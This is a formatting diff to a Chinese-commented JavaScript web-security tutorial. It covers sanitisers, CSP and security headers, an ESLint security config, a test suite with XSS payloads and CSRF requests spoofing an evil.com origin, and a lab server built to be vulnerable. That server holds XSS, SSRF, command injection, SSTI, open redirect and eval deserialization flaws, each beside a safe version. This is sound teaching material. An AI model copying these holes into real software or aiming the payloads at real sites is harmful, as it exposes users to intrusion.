 ```
 
@@ -1217,32 +1344,32 @@ class ServerSideSanitization {
    * 使用 sanitize-html 净化 HTML
    */
   static sanitizeWithSanitizeHtml(dirty, options = {}) {
-    const sanitizeHtml = require('sanitize-html');
+    const sanitizeHtml = require("sanitize-html");
 
     const defaultOptions = {
-      allowedTags: sanitizeHtml.defaults.allowedTags.filter(tag =>
-        !['img', 'iframe', 'object', 'embed', 'form'].includes(tag)
+      allowedTags: sanitizeHtml.defaults.allowedTags.filter(
+        (tag) => !["img", "iframe", "object", "embed", "form"].includes(tag),
       ),
       allowedAttributes: {
-        'a': ['href', 'name', 'target', 'rel'],
-        'p': [],
-        'b': [],
-        'i': [],
-        'strong': [],
-        'em': [],
-        'ul': [],
-        'ol': [],
-        'li': []
+        a: ["href", "name", "target", "rel"],
+        p: [],
+        b: [],
+        i: [],
+        strong: [],
+        em: [],
+        ul: [],
+        ol: [],
+        li: [],
       },
-      allowedSchemes: ['http', 'https', 'mailto'],
+      allowedSchemes: ["http", "https", "mailto"],
       allowedSchemesByTag: {},
       allowProtocolRelative: false,
-      selfClosing: ['br', 'hr'],
+      selfClosing: ["br", "hr"],
       parseStyleAttributes: false,
       textFilter: (text) => {
         // 额外文本过滤：移除零宽字符
-        return text.replace(/[\u200B-\u200D\uFEFF]/g, '');
-      }
+        return text.replace(/[\u200B-\u200D\uFEFF]/g, "");
+      },
     };
 
     return sanitizeHtml(dirty, { ...defaultOptions, ...options });
@@ -1252,11 +1379,11 @@ class ServerSideSanitization {
    * 使用 xss 库净化
    */
   static sanitizeWithXSS(dirty) {
-    const { filterXSS } = require('xss');
+    const { filterXSS } = require("xss");
 
     return filterXSS(dirty, {
       whiteList: {
-        a: ['href', 'title', 'target', 'rel'],
+        a: ["href", "title", "target", "rel"],
         p: [],
         b: [],
         i: [],
@@ -1266,23 +1393,23 @@ class ServerSideSanitization {
         ol: [],
         li: [],
         br: [],
-        hr: []
+        hr: [],
       },
       stripIgnoreTag: true,
-      stripIgnoreTagBody: ['script', 'style'],
+      stripIgnoreTagBody: ["script", "style"],
       onTag: (tag, html, options) => {
         // 自定义标签处理
-        if (tag === 'a' && options.isClosing !== true) {
+        if (tag === "a" && options.isClosing !== true) {
           // 确保所有链接都有 rel="noopener noreferrer"
-          if (!html.includes('rel=')) {
-            return html.replace('>', ' rel="noopener noreferrer">');
+          if (!html.includes("rel=")) {
+            return html.replace(">", ' rel="noopener noreferrer">');
           }
         }
       },
       onIgnoreTag: (tag, html, options) => {
         // 被忽略的标签直接移除
-        return '';
-      }
+        return "";
+      },
     });
   }
 
@@ -1290,26 +1417,26 @@ class ServerSideSanitization {
    * Express 中间件：自动净化请求体
    */
   static createSanitizeMiddleware(options = {}) {
-    const sanitizeHtml = require('sanitize-html');
+    const sanitizeHtml = require("sanitize-html");
 
     return (req, res, next) => {
       if (!req.body) return next();
 
       const sanitizeValue = (value) => {
-        if (typeof value === 'string') {
+        if (typeof value === "string") {
           // 检测是否包含 HTML 标签
           if (/<[^>]*>/.test(value)) {
             return sanitizeHtml(value, options);
           }
           // 纯文本：移除零宽字符和控制字符
           return value
-            .replace(/[\u200B-\u200D\uFEFF]/g, '')
-            .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '');
+            .replace(/[\u200B-\u200D\uFEFF]/g, "")
+            .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, "");
         }
         if (Array.isArray(value)) {
           return value.map(sanitizeValue);
         }
-        if (typeof value === 'object' && value !== null) {
+        if (typeof value === "object" && value !== null) {
           const result = {};
           for (const [key, val] of Object.entries(value)) {
             result[key] = sanitizeValue(val);
@@ -1355,7 +1482,7 @@ class CSPConfig {
       reportUri = null,
       nonce = null,
       trustedTypes = false,
-      allowInline = false
+      allowInline = false,
     } = options;
 
     const directives = [];
@@ -1382,10 +1509,10 @@ class CSPConfig {
         `form-action 'self'`,
         `frame-ancestors 'none'`,
         `upgrade-insecure-requests`,
-        `block-all-mixed-content`
+        `block-all-mixed-content`,
       );
 
-      if (trustedTypes && typeof trustedTypes !== 'undefined') {
+      if (trustedTypes && typeof trustedTypes !== "undefined") {
         directives.push(`require-trusted-types-for 'script'`);
       }
     } else {
@@ -1407,7 +1534,7 @@ class CSPConfig {
         `object-src 'none'`,
         `frame-ancestors 'self'`,
         `base-uri 'self'`,
-        `form-action 'self'`
+        `form-action 'self'`,
       );
     }
 
@@ -1419,12 +1546,12 @@ class CSPConfig {
 
     //  nonce 头（用于内联脚本）
     const headerName = reportOnly
-      ? 'Content-Security-Policy-Report-Only'
-      : 'Content-Security-Policy';
+      ? "Content-Security-Policy-Report-Only"
+      : "Content-Security-Policy";
 
     return {
       header: headerName,
-      value: directives.join('; ')
+      value: directives.join("; "),
     };
   }
 
@@ -1432,11 +1559,11 @@ class CSPConfig {
    * Express 中间件：自动注入 CSP
    */
   static createCSPMiddleware(options = {}) {
-    const crypto = require('crypto');
+    const crypto = require("crypto");
 
     return (req, res, next) => {
       // 生成 nonce
-      const nonce = crypto.randomBytes(16).toString('base64');
+      const nonce = crypto.randomBytes(16).toString("base64");
       res.locals.cspNonce = nonce;
 
       const csp = this.generateCSP({ ...options, nonce });
@@ -1444,11 +1571,14 @@ class CSPConfig {
 
       // 同时设置 Report-To 头
       if (options.reportUri) {
-        res.setHeader('Report-To', JSON.stringify({
-          group: 'csp-endpoint',
-          max_age: 86400,
-          endpoints: [{ url: options.reportUri }]
-        }));
+        res.setHeader(
+          "Report-To",
+          JSON.stringify({
+            group: "csp-endpoint",
+            max_age: 86400,
+            endpoints: [{ url: options.reportUri }],
+          }),
+        );
       }
 
       next();
@@ -1459,17 +1589,17 @@ class CSPConfig {
    * Trusted Types 策略
    */
   static setupTrustedTypes() {
-    if (typeof trustedTypes === 'undefined') return;
+    if (typeof trustedTypes === "undefined") return;
 
     // 默认策略：使用 DOMPurify 净化
-    const defaultPolicy = trustedTypes.createPolicy('default', {
+    const defaultPolicy = trustedTypes.createPolicy("default", {
       createHTML: (string) => {
-        if (typeof DOMPurify !== 'undefined') {
+        if (typeof DOMPurify !== "undefined") {
           return DOMPurify.sanitize(string, { RETURN_TRUSTED_TYPE: true });
         }
         // 降级：返回空字符串
-        console.warn('[CSP] DOMPurify not available, blocking HTML');
-        return '';
+        console.warn("[CSP] DOMPurify not available, blocking HTML");
+        return "";
       },
       createScriptURL: (url) => {
         // 只允许同域脚本
@@ -1478,9 +1608,11 @@ class CSPConfig {
           if (parsed.origin === window.location.origin) {
             return url;
           }
-        } catch (e) { /* invalid */ }
+        } catch (e) {
+          /* invalid */
+        }
         throw new TypeError(`Script URL not allowed: ${url}`);
-      }
+      },
     });
   }
 }
@@ -1500,110 +1632,118 @@ class SecurityHeaders {
   static configure(app) {
     // 1. Content-Security-Policy
     app.use((req, res, next) => {
-      const crypto = require('crypto');
-      const nonce = crypto.randomBytes(16).toString('base64');
+      const crypto = require("crypto");
+      const nonce = crypto.randomBytes(16).toString("base64");
       res.locals.nonce = nonce;
 
-      res.setHeader('Content-Security-Policy', [
-        `default-src 'self'`,
-        `script-src 'self' 'nonce-${nonce}'`,
-        `style-src 'self' 'unsafe-inline'`,
-        `img-src 'self' data: https:`,
-        `font-src 'self'`,
-        `connect-src 'self'`,
-        `object-src 'none'`,
-        `frame-src 'none'`,
-        `base-uri 'self'`,
-        `form-action 'self'`,
-        `frame-ancestors 'none'`,
-        `upgrade-insecure-requests`
-      ].join('; '));
+      res.setHeader(
+        "Content-Security-Policy",
+        [
+          `default-src 'self'`,
+          `script-src 'self' 'nonce-${nonce}'`,
+          `style-src 'self' 'unsafe-inline'`,
+          `img-src 'self' data: https:`,
+          `font-src 'self'`,
+          `connect-src 'self'`,
+          `object-src 'none'`,
+          `frame-src 'none'`,
+          `base-uri 'self'`,
+          `form-action 'self'`,
+          `frame-ancestors 'none'`,
+          `upgrade-insecure-requests`,
+        ].join("; "),
+      );
 
       next();
     });
 
     // 2. Strict-Transport-Security (HSTS)
     app.use((req, res, next) => {
-      res.setHeader('Strict-Transport-Security',
-        'max-age=31536000; includeSubDomains; preload');
+      res.setHeader(
+        "Strict-Transport-Security",
+        "max-age=31536000; includeSubDomains; preload",
+      );
       next();
     });
 
     // 3. X-Content-Type-Options
     app.use((req, res, next) => {
-      res.setHeader('X-Content-Type-Options', 'nosniff');
+      res.setHeader("X-Content-Type-Options", "nosniff");
       next();
     });
 
     // 4. X-Frame-Options
     app.use((req, res, next) => {
-      res.setHeader('X-Frame-Options', 'DENY');
+      res.setHeader("X-Frame-Options", "DENY");
       next();
     });
 
     // 5. Referrer-Policy
     app.use((req, res, next) => {
-      res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
+      res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
       next();
     });
 
     // 6. Permissions-Policy (原 Feature-Policy)
     app.use((req, res, next) => {
-      res.setHeader('Permissions-Policy', [
-        'camera=()',
-        'microphone=()',
-        'geolocation=()',
-        'accelerometer=()',
-        'autoplay=()',
-        'display-capture=()',
-        'document-domain=()',
-        'encrypted-media=()',
-        'execution-while-not-rendered=()',
-        'execution-while-out-of-viewport=()',
-        'fullscreen=()',
-        'gamepad=()',
-        'gyroscope=()',
-        'layout-animations=(self)',
-        'legacy-image-formats=(self)',
-        'magnetometer=()',
-        'midi=()',
-        'oversized-images=(self)',
-        'payment=()',
-        'picture-in-picture=()',
-        'publickey-credentials-get=()',
-        'screen-wake-lock=()',
-        'sync-xhr=(self)',
-        'unoptimized-images=(self)',
-        'unlimited-storage=()',
-        'usb=()',
-        'web-share=()',
-        'xr-spatial-tracking=()'
-      ].join(', '));
+      res.setHeader(
+        "Permissions-Policy",
+        [
+          "camera=()",
+          "microphone=()",
+          "geolocation=()",
+          "accelerometer=()",
+          "autoplay=()",
+          "display-capture=()",
+          "document-domain=()",
+          "encrypted-media=()",
+          "execution-while-not-rendered=()",
+          "execution-while-out-of-viewport=()",
+          "fullscreen=()",
+          "gamepad=()",
+          "gyroscope=()",
+          "layout-animations=(self)",
+          "legacy-image-formats=(self)",
+          "magnetometer=()",
+          "midi=()",
+          "oversized-images=(self)",
+          "payment=()",
+          "picture-in-picture=()",
+          "publickey-credentials-get=()",
+          "screen-wake-lock=()",
+          "sync-xhr=(self)",
+          "unoptimized-images=(self)",
+          "unlimited-storage=()",
+          "usb=()",
+          "web-share=()",
+          "xr-spatial-tracking=()",
+        ].join(", "),
+      );
       next();
     });
 
     // 7. Cross-Origin-Embedder-Policy
     app.use((req, res, next) => {
-      res.setHeader('Cross-Origin-Embedder-Policy', 'require-corp');
+      res.setHeader("Cross-Origin-Embedder-Policy", "require-corp");
       next();
     });
 
     // 8. Cross-Origin-Opener-Policy
     app.use((req, res, next) => {
-      res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
+      res.setHeader("Cross-Origin-Opener-Policy", "same-origin");
       next();
     });
 
     // 9. Cross-Origin-Resource-Policy
     app.use((req, res, next) => {
-      res.setHeader('Cross-Origin-Resource-Policy', 'same-origin');
+      res.setHeader("Cross-Origin-Resource-Policy", "same-origin");
       next();
     });
 
     // 10. 移除泄露信息的头
     app.use((req, res, next) => {
-      res.removeHeader('X-Powered-By');
-      res.removeHeader('Server');
+      res.removeHeader("X-Powered-By");
+      res.removeHeader("Server");
       next();
     });
   }
@@ -1625,62 +1765,60 @@ class SecurityHeaders {
  * 在代码审查阶段捕获安全问题
  */
 module.exports = {
-  plugins: ['security'],
-  extends: [
-    'plugin:security/recommended'
-  ],
+  plugins: ["security"],
+  extends: ["plugin:security/recommended"],
   rules: {
     // 禁止不安全的正则表达式（ReDoS）
-    'security/detect-non-literal-regexp': 'warn',
+    "security/detect-non-literal-regexp": "warn",
 
     // 禁止不安全的 eval
-    'security/detect-eval-with-expression': 'error',
-    'security/detect-no-csrf-before-method-override': 'error',
+    "security/detect-eval-with-expression": "error",
+    "security/detect-no-csrf-before-method-override": "error",
 
     // 禁止不安全的 JSON 解析
-    'security/detect-possible-timing-attacks': 'warn',
+    "security/detect-possible-timing-attacks": "warn",
 
     // 禁止不安全的字符串拼接
-    'security/detect-object-injection': 'warn',
+    "security/detect-object-injection": "warn",
 
     // 禁止不安全的 child_process
-    'security/detect-child-process': 'warn',
+    "security/detect-child-process": "warn",
 
     // 禁止不安全的 Buffer 使用
-    'security/detect-buffer-noassert': 'error',
+    "security/detect-buffer-noassert": "error",
 
     // 禁止不安全的随机数
-    'security/detect-non-literal-fs-filename': 'warn',
+    "security/detect-non-literal-fs-filename": "warn",
 
     // 禁止不安全的 require
-    'security/detect-non-literal-require': 'warn',
-    'security/detect-non-literal-require-calls': 'warn',
+    "security/detect-non-literal-require": "warn",
+    "security/detect-non-literal-require-calls": "warn",
 
     // 自定义规则
-    'no-eval': 'error',
-    'no-implied-eval': 'error',
-    'no-new-func': 'error',
+    "no-eval": "error",
+    "no-implied-eval": "error",
+    "no-new-func": "error",
 
     // 禁止内联事件处理器
-    'no-onload-attribute': 'warn',
+    "no-onload-attribute": "warn",
   },
   overrides: [
     {
-      files: ['**/*.js'],
+      files: ["**/*.js"],
       rules: {
         // 服务端文件额外检查
-        'security/detect-buffer-noassert': 'error',
-        'security/detect-child-process': 'error',
-      }
+        "security/detect-buffer-noassert": "error",
+        "security/detect-child-process": "error",
+      },
     },
     {
-      files: ['**/*.html'],
+      files: ["**/*.html"],
       rules: {
         // 禁止内联事件处理器
-        'no-inline-event-handler': 'error',
-      }
-    }
-  ]
+        "no-inline-event-handler": "error",
+      },
+    },
+  ],
 };
 ```
 
@@ -1754,7 +1892,7 @@ module.exports = {
  *
  * 自动化测试常见的安全漏洞
  */
-const assert = require('assert');
+const assert = require("assert");
 
 class SecurityTestSuite {
   /**
@@ -1762,34 +1900,35 @@ class SecurityTestSuite {
    */
   static async testXSSProtection(supertest, baseUrl) {
     const payloads = [
-      '<script>alert(1)</script>',
-      '<img src=x onerror=alert(1)>',
-      '<svg onload=alert(1)>',
-      'javascript:alert(1)',
-      '<body onload=alert(1)>',
+      "<script>alert(1)</script>",
+      "<img src=x onerror=alert(1)>",
+      "<svg onload=alert(1)>",
+      "javascript:alert(1)",
+      "<body onload=alert(1)>",
       '<iframe src="javascript:alert(1)">',
       '<a href="javascript:alert(1)">click</a>',
       '<div style="background:url(javascript:alert(1))">',
-      '<input onfocus=alert(1) autofocus>',
-      '<marquee onstart=alert(1)>'
+      "<input onfocus=alert(1) autofocus>",
+      "<marquee onstart=alert(1)>",
     ];
 
     const results = [];
 
     for (const payload of payloads) {
       const response = await supertest(baseUrl)
-        .post('/api/comment')
+        .post("/api/comment")
         .send({ content: payload })
         .expect(200);
 
       // 检查响应中是否包含未转义的攻击载荷
-      const isVulnerable = response.text.includes(payload) &&
-        !response.text.includes('&lt;script&gt;');
+      const isVulnerable =
+        response.text.includes(payload) &&
+        !response.text.includes("&lt;script&gt;");
 
       results.push({
         payload,
         vulnerable: isVulnerable,
-        status: isVulnerable ? 'FAIL' : 'PASS'
+        status: isVulnerable ? "FAIL" : "PASS",
       });
     }
 
@@ -1804,24 +1943,32 @@ class SecurityTestSuite {
 
     // 测试不带 CSRF token 的请求
     const endpoints = [
-      { method: 'POST', path: '/api/transfer', body: { to: 'attacker', amount: 100 } },
-      { method: 'PUT', path: '/api/profile', body: { email: 'attacker@evil.com' } },
-      { method: 'DELETE', path: '/api/account' },
+      {
+        method: "POST",
+        path: "/api/transfer",
+        body: { to: "attacker", amount: 100 },
+      },
+      {
+        method: "PUT",
+        path: "/api/profile",
+        body: { email: "attacker@evil.com" },
+      },
+      { method: "DELETE", path: "/api/account" },
     ];
 
     for (const ep of endpoints) {
       const response = await supertest(baseUrl)
         [ep.method.toLowerCase()](ep.path)
         .send(ep.body || {})
-        .set('Origin', 'https://evil.com')
-        .set('Referer', 'https://evil.com/attack');
+        .set("Origin", "https://evil.com")
+        .set("Referer", "https://evil.com/attack");
 
       const isProtected = response.status === 403;
 
       results.push({
         endpoint: `${ep.method} ${ep.path}`,
         protected: isProtected,
-        status: isProtected ? 'PASS' : 'FAIL'
+        status: isProtected ? "PASS" : "FAIL",
       });
     }
 
@@ -1832,30 +1979,32 @@ class SecurityTestSuite {
    * 测试 3: 安全头
    */
   static async testSecurityHeaders(supertest, baseUrl) {
-    const response = await supertest(baseUrl).get('/');
+    const response = await supertest(baseUrl).get("/");
 
     const requiredHeaders = {
-      'Content-Security-Policy': /default-src/,
-      'Strict-Transport-Security': /max-age=/,
-      'X-Content-Type-Options': 'nosniff',
-      'X-Frame-Options': /DENY|SAMEORIGIN/,
-      'Referrer-Policy': /strict-origin/,
-      'Permissions-Policy': /camera=\(\)/,
+      "Content-Security-Policy": /default-src/,
+      "Strict-Transport-Security": /max-age=/,
+      "X-Content-Type-Options": "nosniff",
+      "X-Frame-Options": /DENY|SAMEORIGIN/,
+      "Referrer-Policy": /strict-origin/,
+      "Permissions-Policy": /camera=\(\)/,
     };
 
     const results = [];
 
     for (const [header, pattern] of Object.entries(requiredHeaders)) {
       const value = response.headers[header.toLowerCase()];
-      const isSet = value && (typeof pattern === 'string'
-        ? value.includes(pattern)
-        : pattern.test(value));
+      const isSet =
+        value &&
+        (typeof pattern === "string"
+          ? value.includes(pattern)
+          : pattern.test(value));
 
       results.push({
         header,
         set: !!isSet,
-        value: value || '(missing)',
-        status: isSet ? 'PASS' : 'FAIL'
+        value: value || "(missing)",
+        status: isSet ? "PASS" : "FAIL",
       });
     }
 
@@ -1867,36 +2016,36 @@ class SecurityTestSuite {
    */
   static async testCookieSecurity(supertest, baseUrl) {
     const response = await supertest(baseUrl)
-      .post('/api/login')
-      .send({ username: 'test', password: 'test' });
+      .post("/api/login")
+      .send({ username: "test", password: "test" });
 
-    const setCookie = response.headers['set-cookie'];
+    const setCookie = response.headers["set-cookie"];
     if (!setCookie) {
-      return [{ header: 'Set-Cookie', set: false, status: 'FAIL' }];
+      return [{ header: "Set-Cookie", set: false, status: "FAIL" }];
     }
 
-    const cookieStr = setCookie.join('; ');
+    const cookieStr = setCookie.join("; ");
     const results = [
       {
-        attribute: 'HttpOnly',
-        set: cookieStr.includes('HttpOnly'),
-        status: cookieStr.includes('HttpOnly') ? 'PASS' : 'FAIL'
+        attribute: "HttpOnly",
+        set: cookieStr.includes("HttpOnly"),
+        status: cookieStr.includes("HttpOnly") ? "PASS" : "FAIL",
       },
       {
-        attribute: 'Secure',
-        set: cookieStr.includes('Secure'),
-        status: cookieStr.includes('Secure') ? 'PASS' : 'FAIL'
+        attribute: "Secure",
+        set: cookieStr.includes("Secure"),
+        status: cookieStr.includes("Secure") ? "PASS" : "FAIL",
       },
       {
-        attribute: 'SameSite',
+        attribute: "SameSite",
         set: /SameSite=(Strict|Lax)/i.test(cookieStr),
-        status: /SameSite=(Strict|Lax)/i.test(cookieStr) ? 'PASS' : 'FAIL'
+        status: /SameSite=(Strict|Lax)/i.test(cookieStr) ? "PASS" : "FAIL",
       },
       {
-        attribute: 'Path',
-        set: cookieStr.includes('Path=/'),
-        status: cookieStr.includes('Path=/') ? 'PASS' : 'FAIL'
-      }
+        attribute: "Path",
+        set: cookieStr.includes("Path=/"),
+        status: cookieStr.includes("Path=/") ? "PASS" : "FAIL",
+      },
     ];
 
     return results;
@@ -1906,7 +2055,7 @@ class SecurityTestSuite {
    * 运行所有安全测试
    */
   static async runAll(supertest, baseUrl) {
-    console.log('🔐 Running Security Test Suite...\n');
+    console.log("🔐 Running Security Test Suite...\n");
 
     const results = {
       xss: await this.testXSSProtection(supertest, baseUrl),
@@ -1917,16 +2066,22 @@ class SecurityTestSuite {
 
     // 汇总
     const allResults = Object.values(results).flat();
-    const passed = allResults.filter(r => r.status === 'PASS').length;
-    const failed = allResults.filter(r => r.status === 'FAIL').length;
+    const passed = allResults.filter((r) => r.status === "PASS").length;
+    const failed = allResults.filter((r) => r.status === "FAIL").length;
 
-    console.log(`\n📊 Security Test Results: ${passed} passed, ${failed} failed`);
+    console.log(
+      `\n📊 Security Test Results: ${passed} passed, ${failed} failed`,
+    );
 
     if (failed > 0) {
-      console.log('\n❌ Failed tests:');
-      allResults.filter(r => r.status === 'FAIL').forEach(r => {
-        console.log(`  - ${r.header || r.payload || r.endpoint || r.attribute}`);
-      });
+      console.log("\n❌ Failed tests:");
+      allResults
+        .filter((r) => r.status === "FAIL")
+        .forEach((r) => {
+          console.log(
+            `  - ${r.header || r.payload || r.endpoint || r.attribute}`,
+          );
+        });
     }
 
     return results;
@@ -1951,9 +2106,9 @@ module.exports = SecurityTestSuite;
  * 故意包含安全漏洞，用于学习
  * ⚠️ 仅限本地学习环境，禁止部署到生产环境
  */
-const express = require('express');
-const cookieParser = require('cookie-parser');
-const crypto = require('crypto');
+const express = require("express");
+const cookieParser = require("cookie-parser");
+const crypto = require("crypto");
 
 const app = express();
 app.use(express.json());
@@ -1962,48 +2117,47 @@ app.use(cookieParser());
 
 // 模拟用户数据库
 const users = {
-  admin: { password: 'admin123', role: 'admin' },
-  user: { password: 'user123', role: 'user' }
+  admin: { password: "admin123", role: "admin" },
+  user: { password: "user123", role: "user" },
 };
 
 // ==================== 漏洞 1: XSS ====================
 
 // 危险：直接渲染用户输入
-app.post('/vulnerable/comment', (req, res) => {
+app.post("/vulnerable/comment", (req, res) => {
   const { content } = req.body;
   // 漏洞：未转义直接输出
   res.send(`<div class="comment">${content}</div>`);
 });
 
 // 安全版本
-app.post('/safe/comment', (req, res) => {
+app.post("/safe/comment", (req, res) => {
   const { content } = req.body;
   const escaped = content
-    .replace(/&/g, '&amp;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;')
-    .replace(/"/g, '&quot;')
-    .replace(/'/g, '&#x27;');
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#x27;");
   res.send(`<div class="comment">${escaped}</div>`);
 });
 
 // ==================== 漏洞 2: CSRF ====================
 
 // 危险：无 CSRF 保护的转账端点
-app.post('/vulnerable/transfer', (req, res) => {
+app.post("/vulnerable/transfer", (req, res) => {
   const { to, amount } = req.body;
   // 漏洞：没有验证 CSRF token
   res.json({ success: true, message: `Transferred ${amount} to ${to}` });
 });
 
 // 安全版本：双重 Cookie 验证
-app.post('/safe/transfer', (req, res) => {
-  const cookieToken = req.cookies['XSRF-TOKEN'];
-  const headerToken = req.headers['x-xsrf-token'];
+app.post("/safe/transfer", (req, res) => {
+  const cookieToken = req.cookies["XSRF-TOKEN"];
+  const headerToken = req.headers["x-xsrf-token"];
 
-  if (!cookieToken || !headerToken ||
-    cookieToken !== headerToken) {
-    return res.status(403).json({ error: 'CSRF verification failed' });
+  if (!cookieToken || !headerToken || cookieToken !== headerToken) {
+    return res.status(403).json({ error: "CSRF verification failed" });
   }
 
   const { to, amount } = req.body;
@@ -2012,70 +2166,70 @@ app.post('/safe/transfer', (req, res) => {
 
 // ==================== 漏洞 3: SSRF ====================
 
-const fetch = require('node-fetch');
+const fetch = require("node-fetch");
 
 // 危险：无限制的 URL 获取
-app.get('/vulnerable/fetch', async (req, res) => {
+app.get("/vulnerable/fetch", async (req, res) => {
   const { url } = req.query;
   try {
     const response = await fetch(url);
     const text = await response.text();
     res.send(text);
   } catch (err) {
-    res.status(500).send('Fetch failed');
+    res.status(500).send("Fetch failed");
   }
 });
 
 // 安全版本：URL 白名单 + IP 验证
-app.get('/safe/fetch', async (req, res) => {
+app.get("/safe/fetch", async (req, res) => {
   const { url } = req.query;
-  const allowedDomains = ['example.com', 'httpbin.org'];
+  const allowedDomains = ["example.com", "httpbin.org"];
 
   try {
     const parsed = new URL(url);
     if (!allowedDomains.includes(parsed.hostname)) {
-      return res.status(403).json({ error: 'Domain not allowed' });
+      return res.status(403).json({ error: "Domain not allowed" });
     }
     const response = await fetch(url);
     const text = await response.text();
     res.send(text);
   } catch (err) {
-    res.status(400).json({ error: 'Invalid URL' });
+    res.status(400).json({ error: "Invalid URL" });
   }
 });
 
 // ==================== 漏洞 4: 命令注入 ====================
 
-const { exec } = require('child_process');
+const { exec } = require("child_process");
 
 // 危险：直接拼接用户输入
-app.post('/vulnerable/ping', (req, res) => {
+app.post("/vulnerable/ping", (req, res) => {
   const { host } = req.body;
   exec(`ping -c 1 ${host}`, (err, stdout) => {
-    if (err) return res.status(500).send('Ping failed');
+    if (err) return res.status(500).send("Ping failed");
     res.send(stdout);
   });
 });
 
 // 安全版本：execFile + 输入验证
-app.post('/safe/ping', (req, res) => {
+app.post("/safe/ping", (req, res) => {
   const { host } = req.body;
   if (!/^[a-zA-Z0-9._-]+$/.test(host)) {
-    return res.status(400).json({ error: 'Invalid host' });
+    return res.status(400).json({ error: "Invalid host" });
   }
-  const { execFile } = require('child_process');
-  execFile('ping', ['-c', '1', host], { timeout: 5000 }, (err, stdout) => {
-    if (err) return res.status(500).json({ error: 'Ping failed' });
+  const { execFile } = require("child_process");
+  execFile("ping", ["-c", "1", host], { timeout: 5000 }, (err, stdout) => {
+    if (err) return res.status(500).json({ error: "Ping failed" });
     res.send(stdout);
   });
 });
 
 // ==================== 漏洞 5: SSTI ====================
 
-const ejs = require('ejs');
+const ejs = require("ejs");
 
 // 危险：用户输入作为模板
-app.post('/vulnerable/template', (req, res) => {
+app.post("/vulnerable/template", (req, res) => {
   const { template, name } = req.body;
   // 漏洞：用户控制模板内容
   const html = ejs.render(template, { name });
@@ -2083,81 +2237,81 @@ app.post('/vulnerable/template', (req, res) => {
 });
 
 // 安全版本：固定模板
-app.post('/safe/template', (req, res) => {
+app.post("/safe/template", (req, res) => {
   const { name } = req.body;
   // 安全：模板固定，用户输入只作为数据
-  const html = ejs.render('<h1>Hello, <%= name %></h1>', { name });
+  const html = ejs.render("<h1>Hello, <%= name %></h1>", { name });
   res.send(html);
 });
 
 // ==================== 漏洞 6: 开放重定向 ====================
 
 // 危险：任意重定向
-app.get('/vulnerable/redirect', (req, res) => {
+app.get("/vulnerable/redirect", (req, res) => {
   const { url } = req.query;
   res.redirect(url);
 });
 
 // 安全版本：白名单重定向
-app.get('/safe/redirect', (req, res) => {
+app.get("/safe/redirect", (req, res) => {
   const { url } = req.query;
-  const allowedUrls = ['/home', '/dashboard', '/profile', '/settings'];
+  const allowedUrls = ["/home", "/dashboard", "/profile", "/settings"];
   if (allowedUrls.includes(url)) {
     res.redirect(url);
   } else {
-    res.status(400).json({ error: 'Invalid redirect URL' });
+    res.status(400).json({ error: "Invalid redirect URL" });
   }
 });
 
 // ==================== 漏洞 7: 信息泄露 ====================
 
 // 危险：详细错误信息
-app.get('/vulnerable/error', (req, res) => {
+app.get("/vulnerable/error", (req, res) => {
   try {
-    JSON.parse('invalid json');
+    JSON.parse("invalid json");
   } catch (err) {
     // 漏洞：泄露堆栈跟踪
     res.status(500).json({
       error: err.message,
       stack: err.stack,
-      code: err.code
+      code: err.code,
     });
   }
 });
 
 // 安全版本：通用错误信息
-app.get('/safe/error', (req, res) => {
+app.get("/safe/error", (req, res) => {
   try {
-    JSON.parse('invalid json');
+    JSON.parse("invalid json");
   } catch (err) {
     // 安全：只返回通用错误
     console.error(err); // 日志记录详细信息
-    res.status(500).json({ error: 'Internal server error' });
+    res.status(500).json({ error: "Internal server error" });
   }
 });
 
 // ==================== 漏洞 8: 不安全的反序列化 ====================
 
 // 危险：直接反序列化用户输入
-app.post('/vulnerable/deserialize', (req, res) => {
+app.post("/vulnerable/deserialize", (req, res) => {
   const { data } = req.body;
   try {
     // 漏洞：用户控制的反序列化
-    const obj = eval('(' + data + ')');
+    const obj = eval("(" + data + ")");
     res.json(obj);
   } catch (err) {
-    res.status(400).json({ error: 'Invalid data' });
+    res.status(400).json({ error: "Invalid data" });
   }
 });
 
 // 安全版本：JSON.parse
-app.post('/safe/deserialize', (req, res) => {
+app.post("/safe/deserialize", (req, res) => {
   const { data } = req.body;
   try {
     const obj = JSON.parse(data);
     res.json(obj);
   } catch (err) {
-    res.status(400).json({ error: 'Invalid JSON' });
+    res.status(400).json({ error: "Invalid JSON" });
   }
 });
 
@@ -2165,7 +2319,7 @@ app.post('/safe/deserialize', (req, res) => {
 const PORT = process.env.PORT || 3456;
 app.listen(PORT, () => {
   console.log(`🔐 Security Lab running on http://localhost:${PORT}`);
-  console.log('⚠️  仅限本地学习使用，禁止部署到生产环境！');
+  console.log("⚠️  仅限本地学习使用，禁止部署到生产环境！");
 });
 
 module.exports = app;
@@ -2187,7 +2341,7 @@ class AttackScripts {
    * 演练 1: XSS 攻击与防御验证
    */
   static async testXSS(baseUrl) {
-    console.log('=== 演练 1: XSS 攻击与防御 ===\n');
+    console.log("=== 演练 1: XSS 攻击与防御 ===\n");
 
     const payloads = [
       '<script>alert("XSS")</script>',
@@ -2202,24 +2356,29 @@ class AttackScripts {
 
       // 攻击漏洞端点
       const vulnRes = await fetch(`${baseUrl}/vulnerable/comment`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: payload })
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: payload }),
       });
       const vulnText = await vulnRes.text();
-      const vulnVulnerable = vulnText.includes('<script>') ||
-        vulnText.includes('onerror=');
-      console.log(`  🔴 Vulnerable endpoint: ${vulnVulnerable ? 'EXPLOITED ❌' : 'Safe ✅'}`);
+      const vulnVulnerable =
+        vulnText.includes("<script>") || vulnText.includes("onerror=");
+      console.log(
+        `  🔴 Vulnerable endpoint: ${vulnVulnerable ? "EXPLOITED ❌" : "Safe ✅"}`,
+      );
 
       // 测试安全端点
       const safeRes = await fetch(`${baseUrl}/safe/comment`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: payload })
+        method: "POST",
